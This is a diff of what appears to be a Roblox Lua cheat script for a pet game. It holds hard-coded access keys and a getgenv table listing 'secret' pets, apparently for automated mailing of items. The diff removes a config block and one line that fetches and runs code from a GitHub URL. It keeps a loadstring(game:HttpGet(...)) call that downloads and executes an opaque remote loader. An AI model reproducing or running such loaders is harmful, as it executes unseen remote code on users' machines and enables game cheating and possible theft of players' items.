@@ -12,14 +12,6 @@ game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
 settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
 settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level04
 settings().Rendering.GraphicsMode = 9
-
--- ⚙️ CONFIG
-_G.Config = {
-    UserID = "0d28ea66-a410-47c0-a707-06d7cb199774",
-    discord_id = "698853568291143821",
-    Note = "Pc",
-}
-
 -- 🔑 KEY SYSTEM
 local keys = {
     "gBgCmAPZTSmdqGHMSmmUdgFuEcELDZWK", 
@@ -69,7 +61,4 @@ getgenv().GMAIL_ITEMS = {
   ["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
   ["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},
 }
-
--- ✅ LOAD SCRIPT CUỐI CÙNG
-loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/pet99"))()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6e75890d2e36b4613270666c4f5ccab3.lua"))()
